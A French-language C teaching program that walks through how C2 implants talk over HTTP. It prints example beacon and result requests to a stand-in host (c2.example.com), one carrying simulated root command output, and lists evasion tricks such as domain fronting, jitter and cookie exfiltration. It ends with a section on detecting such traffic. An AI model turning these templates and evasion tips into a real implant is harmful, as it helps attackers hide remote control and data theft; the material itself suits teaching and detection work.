/*
 * OBJECTIF  : Comprendre les communications HTTP pour le C2
 * PREREQUIS : Bases C, sockets TCP, protocole HTTP
 * COMPILE   : gcc -o example example.c
 *
 * Ce programme demontre les techniques de communication HTTP
 * utilisees par les implants C2 : construction de requetes,
 * parsing de reponses, sockets raw vs libcurl, et techniques
 * d'evasion HTTP. Demonstration pedagogique.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>

/*
 * Etape 1 : Architecture HTTP pour le C2
 */
static void explain_http_c2(void) {
    printf("[*] Etape 1 : Architecture HTTP pour le C2\n\n");

    printf("    ┌──────────────┐         ┌──────────────┐\n");
    printf("    │   IMPLANT    │  HTTP    │  C2 SERVER   │\n");
    printf("    │              │────────> │              │\n");
    printf("    │  beacon      │  GET     │  /api/task   │\n");
    printf("    │  exec cmd    │ <─────── │  return cmd  │\n");
    printf("    │  send result │  POST    │              │\n");
    printf("    │              │────────> │  /api/result │\n");
    printf("    └──────────────┘         └──────────────┘\n\n");

    printf("    Cycle de communication C2 :\n");
    printf("    1. Implant envoie GET /api/task (check-in)\n");
    printf("    2. Serveur repond avec une commande (ou rien)\n");
    printf("    3. Implant execute la commande\n");
    printf("    4. Implant envoie POST /api/result avec le resultat\n");
    printf("    5. Sleep puis recommencer\n\n");

    printf("    Pourquoi HTTP :\n");
    printf("    - Port 80/443 presque toujours ouvert\n");
    printf("    - Se fond dans le trafic web normal\n");
    printf("    - Passe les proxies d'entreprise\n");
    printf("    - Facile a implementer\n\n");
}

/*
 * Etape 2 : Construction d'une requete HTTP
 */
static void explain_http_request(void) {
    printf("[*] Etape 2 : Construction d'une requete HTTP\n\n");

    printf("    Requete GET :\n");
    printf("    ───────────────────────────────────\n");
    printf("    GET /api/task HTTP/1.1\\r\\n\n");
    printf("    Host: c2.example.com\\r\\n\n");
    printf("    User-Agent: Mozilla/5.0 ...\\r\\n\n");
    printf("    Accept: text/html\\r\\n\n");
    printf("    Connection: close\\r\\n\n");
    printf("    \\r\\n\n\n");

    printf("    Requete POST (envoi de resultats) :\n");
    printf("    ───────────────────────────────────\n");
    printf("    POST /api/result HTTP/1.1\\r\\n\n");
    printf("    Host: c2.example.com\\r\\n\n");
    printf("    Content-Type: application/json\\r\\n\n");
    printf("    Content-Length: 42\\r\\n\n");
    printf("    \\r\\n\n");
    printf("    {\"id\":\"abc\",\"output\":\"uid=0(root)\"}\n\n");

    /* Construction en C */
    char request[512];
    const char *host = "example.com";
    const char *path = "/api/task";
    const char *ua = "Mozilla/5.0 (X11; Linux x86_64)";

    int len = snprintf(request, sizeof(request),
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Accept: */*\r\n"
        "Connection: close\r\n"
        "\r\n",
        path, host, ua);

    printf("    Requete construite en C (%d octets) :\n", len);
    printf("    ───────────────────────────────────\n");

    /* Afficher ligne par ligne */
    char *line = request;
    while (*line) {
        char *end = strstr(line, "\r\n");
        if (!end) break;
        printf("    | %.*s\n", (int)(end - line), line);
        line = end + 2;
    }
    printf("\n");
}

/*
 * Etape 3 : Resolution DNS et connexion TCP
 */
static void demo_dns_resolve(void) {
    printf("[*] Etape 3 : Resolution DNS et connexion TCP\n\n");

    const char *hostname = "example.com";
    printf("    Resolution de '%s' :\n", hostname);

    struct addrinfo hints = {0}, *res;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    int ret = getaddrinfo(hostname, "80", &hints, &res);
    if (ret != 0) {
        printf("    Erreur getaddrinfo : %s\n\n", gai_strerror(ret));
        return;
    }

    struct sockaddr_in *addr = (struct sockaddr_in *)res->ai_addr;
    printf("    IP resolue : %s\n\n", inet_ntoa(addr->sin_addr));

    printf("    Code de connexion TCP :\n");
    printf("    ───────────────────────────────────\n");
    printf("    int sock = socket(AF_INET, SOCK_STREAM, 0);\n");
    printf("    struct sockaddr_in sa = {\n");
    printf("        .sin_family = AF_INET,\n");
    printf("        .sin_port   = htons(80),\n");
    printf("        .sin_addr   = resolved_ip,\n");
    printf("    };\n");
    printf("    connect(sock, (struct sockaddr *)&sa, sizeof(sa));\n");
    printf("    send(sock, request, strlen(request), 0);\n");
    printf("    recv(sock, response, sizeof(response), 0);\n");
    printf("    close(sock);\n\n");

    freeaddrinfo(res);
}

/*
 * Etape 4 : Parsing de la reponse HTTP
 */
static void explain_http_response(void) {
    printf("[*] Etape 4 : Parsing de la reponse HTTP\n\n");

    /* Reponse simulee */
    const char *response =
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: 35\r\n"
        "\r\n"
        "{\"cmd\":\"id\",\"id\":\"task-001\"}";

    printf("    Reponse brute :\n");
    printf("    ───────────────────────────────────\n");

    /* Afficher ligne par ligne */
    const char *p = response;
    while (*p) {
        const char *end = strstr(p, "\r\n");
        if (!end) {
            printf("    | %s\n", p);
            break;
        }
        if (end == p) {
            printf("    | (ligne vide = fin des headers)\n");
            p = end + 2;
            printf("    | BODY: %s\n", p);
            break;
        }
        printf("    | %.*s\n", (int)(end - p), p);
        p = end + 2;
    }
    printf("\n");

    /* Parsing du status code */
    printf("    Parsing du status code :\n");
    int status = 0;
    if (sscanf(response, "HTTP/1.%*d %d", &status) == 1)
        printf("    Status = %d\n\n", status);

    /* Parsing du body */
    const char *body = strstr(response, "\r\n\r\n");
    if (body) {
        body += 4;
        printf("    Body extrait : %s\n", body);

        /* Extraction simple du champ cmd */
        const char *cmd_start = strstr(body, "\"cmd\":\"");
        if (cmd_start) {
            cmd_start += 7;
            const char *cmd_end = strchr(cmd_start, '"');
            if (cmd_end) {
                char cmd[64] = {0};
                strncpy(cmd, cmd_start, cmd_end - cmd_start);
                printf("    Commande extraite : '%s'\n", cmd);
            }
        }
    }
    printf("\n");
}

/*
 * Etape 5 : Construction d'un POST avec body
 */
static void demo_post_request(void) {
    printf("[*] Etape 5 : Construction d'un POST avec resultats\n\n");

    /* Simuler le resultat d'une commande */
    const char *task_id = "task-001";
    const char *output = "uid=0(root) gid=0(root)";

    /* Construire le body JSON */
    char body[256];
    int body_len = snprintf(body, sizeof(body),
        "{\"id\":\"%s\",\"output\":\"%s\"}", task_id, output);

    /* Construire la requete POST complete */
    char request[1024];
    int req_len = snprintf(request, sizeof(request),
        "POST /api/result HTTP/1.1\r\n"
        "Host: c2.example.com\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: %d\r\n"
        "User-Agent: Mozilla/5.0 (X11; Linux x86_64)\r\n"
        "Connection: close\r\n"
        "\r\n"
        "%s",
        body_len, body);

    printf("    Requete POST complete (%d octets) :\n", req_len);
    printf("    ───────────────────────────────────\n");

    char *line = request;
    while (*line) {
        char *end = strstr(line, "\r\n");
        if (!end) {
            printf("    | %s\n", line);
            break;
        }
        if (end == line) {
            printf("    | (fin headers)\n");
            line = end + 2;
            printf("    | BODY: %s\n", line);
            break;
        }
        printf("    | %.*s\n", (int)(end - line), line);
        line = end + 2;
    }
    printf("\n");
}

/*
 * Etape 6 : Techniques d'evasion HTTP
 */
static void explain_evasion(void) {
    printf("[*] Etape 6 : Techniques d'evasion HTTP\n\n");

    printf("    Technique         | Description\n");
    printf("    ──────────────────|──────────────────────────────────\n");
    printf("    HTTPS/TLS         | Chiffrer le trafic (port 443)\n");
    printf("    Domain fronting   | Host: legit.com, SNI: cdn.com\n");
    printf("    User-Agent legit  | Imiter un navigateur reel\n");
    printf("    Jitter            | Varier le timing des requetes\n");
    printf("    Custom headers    | Ajouter des headers realistes\n");
    printf("    Malleable C2      | Profil qui imite du trafic legit\n");
    printf("    Base64 body       | Encoder les donnees en transit\n");
    printf("    Cookie exfil      | Donnees dans les cookies\n\n");

    printf("    Exemple de headers realistes :\n");
    printf("    ───────────────────────────────────\n");
    printf("    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0)\n");
    printf("    Accept: text/html,application/xhtml+xml\n");
    printf("    Accept-Language: en-US,en;q=0.5\n");
    printf("    Accept-Encoding: gzip, deflate, br\n");
    printf("    DNT: 1\n");
    printf("    Upgrade-Insecure-Requests: 1\n\n");

    printf("    Proxy support (entreprise) :\n");
    printf("    ───────────────────────────────────\n");
    printf("    // Detecter le proxy via les variables d'env\n");
    printf("    char *proxy = getenv(\"http_proxy\");\n");
    printf("    if (!proxy) proxy = getenv(\"HTTP_PROXY\");\n");
    printf("    // Ou via PAC file / WPAD\n\n");

    /* Demo : verifier les variables proxy */
    printf("    Variables proxy de l'environnement :\n");
    const char *vars[] = {"http_proxy", "https_proxy", "HTTP_PROXY",
                          "HTTPS_PROXY", "no_proxy", NULL};
    int found = 0;
    for (int i = 0; vars[i]; i++) {
        char *val = getenv(vars[i]);
        if (val) {
            printf("      %s = %s\n", vars[i], val);
            found = 1;
        }
    }
    if (!found)
        printf("      (aucun proxy configure)\n");
    printf("\n");
}

/*
 * Etape 7 : Detection des communications C2 HTTP
 */
static void explain_detection(void) {
    printf("[*] Etape 7 : Detection des communications C2 HTTP\n\n");

    printf("    Indicateurs suspects :\n");
    printf("    ───────────────────────────────────\n");
    printf("    1. Beaconing regulier (intervalle fixe)\n");
    printf("       -> Analyser la periodicite des requetes\n\n");
    printf("    2. User-Agent inhabituel ou absent\n");
    printf("       -> Comparer avec les navigateurs connus\n\n");
    printf("    3. Trafic vers des domaines recents/suspects\n");
    printf("       -> Threat intelligence, reputation DNS\n\n");
    printf("    4. POST volumineux vers des URLs inconnues\n");
    printf("       -> Exfiltration de donnees\n\n");
    printf("    5. Trafic HTTPS sans SNI ou avec JA3 suspect\n");
    printf("       -> JA3 fingerprinting du TLS handshake\n\n");

    printf("    Outils de detection :\n");
    printf("    - Suricata/Snort : signatures IDS/IPS\n");
    printf("    - Zeek (Bro)     : analyse protocolaire\n");
    printf("    - RITA            : detection de beaconing\n");
    printf("    - JA3/JA3S       : fingerprint TLS\n");
    printf("    - Proxy logs     : analyse des requetes HTTP\n\n");
}

int main(void) {
    printf("[*] Demo : HTTP Client Linux - Communication C2\n\n");

    explain_http_c2();
    explain_http_request();
    demo_dns_resolve();
    explain_http_response();
    demo_post_request();
    explain_evasion();
    explain_detection();

    printf("[+] Demo terminee avec succes\n");
    return 0;
}
